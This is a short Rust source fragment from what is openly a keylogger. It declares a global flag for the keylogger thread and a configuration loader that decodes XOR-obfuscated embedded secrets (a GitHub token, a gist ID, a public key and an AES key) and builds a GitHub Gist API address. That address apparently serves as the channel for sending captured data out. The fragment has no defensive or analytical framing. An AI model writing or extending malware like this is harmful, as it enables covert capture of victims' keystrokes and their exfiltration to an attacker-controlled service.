// Global shared state to control keylogger thread
static KEYLOGGER_RUNNING: AtomicBool = AtomicBool::new(false);

// Configuration struct to hold loaded values
struct Config {
    github_token: String,
    gist_id: String,
    gist_api_url: String,
    public_key_pem: String,
    aes_key_hex: String,
}

impl Config {
    fn load() -> Result<Self, Box<dyn Error>> {
        let github_token = String::from_utf8(xor_decrypt(secrets::ENC_GITHUB_TOKEN))
            .map_err(|_| "Failed to decode embedded GITHUB_TOKEN")?;
        let gist_id = String::from_utf8(xor_decrypt(secrets::ENC_GIST_ID))
            .map_err(|_| "Failed to decode embedded GIST_ID")?;
        let public_key_pem = String::from_utf8(xor_decrypt(secrets::ENC_PUBLIC_KEY))
            .map_err(|_| "Failed to decode embedded public key")?;
        let aes_key_hex = String::from_utf8(xor_decrypt(secrets::ENC_AES_KEY_HEX))
            .map_err(|_| "Failed to decode embedded AES key")?;
        let aes_key_hex = aes_key_hex.trim().to_string();

        Ok(Config {
            github_token,
            gist_id: gist_id.clone(),
            gist_api_url: format!("https://api.github.com/gists/{}", gist_id),
            public_key_pem,
            aes_key_hex,
        })
    }
}

